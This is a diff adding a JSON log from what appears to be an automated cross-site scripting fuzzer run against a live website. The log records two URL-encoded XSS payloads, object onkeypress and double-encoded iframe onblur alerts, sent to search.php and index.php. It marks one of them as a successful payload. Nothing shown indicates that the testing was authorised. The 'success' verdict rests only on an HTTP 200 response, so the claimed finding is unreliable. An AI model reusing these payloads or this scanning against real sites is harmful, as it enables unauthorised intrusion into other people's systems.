@@ -1,0 +1,65 @@
+{
+  "summary": {
+    "total_tests_conducted": 2,
+    "max_tests_planned": 5000,
+    "tests_completed": false,
+    "successful_payloads_found": 1,
+    "blocked_requests": 0,
+    "error_requests": 0,
+    "success_rate": 50.0,
+    "block_rate": 0.0,
+    "end_time": "2025-07-28T18:12:51.747653"
+  },
+  "successful_payloads": [
+    {
+      "test_number": 2,
+      "timestamp": "2025-07-28T18:12:49.663875",
+      "url": "https://pakyok77.link/index.php",
+      "method": "GET",
+      "parameter": "file",
+      "payload": "%3Cobject%20onkeypress%3Dalert%28%27XSS%27%29%3E",
+      "payload_hash": "33ea296c",
+      "status_code": 200,
+      "response_length": 69435,
+      "response_time": 1.849,
+      "blocked": false,
+      "success": true,
+      "error": null,
+      "response_preview": "<!DOCTYPE html>\n<html lang=\"en-US\" prefix=\"og: https://ogp.me/ns#\" class=\"loading-site no-js\">\n<head>\n\t<meta charset=\"UTF-8\" />\n\t<link rel=\"profile\" href=\"https://gmpg.org/xfn/11\" />\n\t<link rel=\"pingb"
+    }
+  ],
+  "test_log": [
+    {
+      "test_number": 1,
+      "timestamp": "2025-07-28T18:12:47.753526",
+      "url": "https://pakyok77.link/search.php",
+      "method": "POST",
+      "parameter": "search",
+      "payload": "%253Ciframe%2520onblur%253D%2527alert%2528%2522XSS%2522%2529%2527%253E",
+      "payload_hash": "d93e558a",
+      "status_code": 404,
+      "response_length": 40701,
+      "response_time": 1.755,
+      "blocked": false,
+      "success": false,
+      "error": null,
+      "response_preview": "<!DOCTYPE html><html lang=\"en-US\" prefix=\"og: https://ogp.me/ns#\" class=\"loading-site no-js\"><head><meta charset=\"UTF-8\" /><link rel=\"profile\" href=\"https://gmpg.org/xfn/11\" /><link rel=\"pingback\" hre"
+    },
+    {
+      "test_number": 2,
+      "timestamp": "2025-07-28T18:12:49.663875",
+      "url": "https://pakyok77.link/index.php",
+      "method": "GET",
+      "parameter": "file",
+      "payload": "%3Cobject%20onkeypress%3Dalert%28%27XSS%27%29%3E",
+      "payload_hash": "33ea296c",
+      "status_code": 200,
+      "response_length": 69435,
+      "response_time": 1.849,
+      "blocked": false,
+      "success": true,
+      "error": null,
+      "response_preview": "<!DOCTYPE html>\n<html lang=\"en-US\" prefix=\"og: https://ogp.me/ns#\" class=\"loading-site no-js\">\n<head>\n\t<meta charset=\"UTF-8\" />\n\t<link rel=\"profile\" href=\"https://gmpg.org/xfn/11\" />\n\t<link rel=\"pingb"
+    }
+  ]
+}
